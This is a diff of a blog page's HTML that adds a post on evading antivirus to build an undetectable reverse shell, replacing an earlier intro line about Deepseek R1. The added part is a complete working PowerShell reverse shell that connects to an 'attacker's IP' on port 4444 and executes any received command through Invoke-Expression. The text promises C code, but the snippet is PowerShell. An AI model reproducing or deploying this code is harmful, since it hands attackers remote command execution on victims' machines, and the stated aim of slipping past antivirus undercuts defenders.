@@ -91,8 +91,44 @@
         Posts
       </aside><div id="sharing" class="mt3 ananke-socials"></div>
 <h1 class="f1 athelas mt3 mb1">Upgrading Reverse Shell in C to evade AV mechanisms</h1>
-<h3>This post is going to discuss some critical flaws in Deepseek R1    
-	<img src="/images/1.png" alt="example" width="500" height="300">    
+<h3>This post is an attempt to evade AV mechanisms/tools to generate undetectable reverse shell in C, To start I have mentioned a very basic C code which generates a Callback to a remote listener.    
+	<div>
+    <h3>PowerShell Reverse Shell</h3>
+    <pre><code>
+        # Reverse Shell in PowerShell
+        $ip = "192.168.1.100"    # Replace with attacker's IP
+        $port = 4444              # Replace with desired port
+
+        # Create a TCP client
+        $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
+        $stream = $client.GetStream()
+        $reader = New-Object System.IO.StreamReader($stream)
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $writer.AutoFlush = $true
+
+        # Redirect input, output, and error
+        while ($client.Connected) {
+            $command = $reader.ReadLine()
+            if ($command -eq "exit") { break }
+
+            try {
+                # Execute the command and capture output
+                $output = (Invoke-Expression -Command $command 2>&1 | Out-String)
+            }
+            catch {
+                $output = "Error: $_"
+            }
+
+            # Send output back to attacker
+            $writer.WriteLine($output)
+        }
+
+        # Clean up
+        $reader.Close()
+        $writer.Close()
+        $client.Close()
+    </code></pre>
+</div>
       
       
       
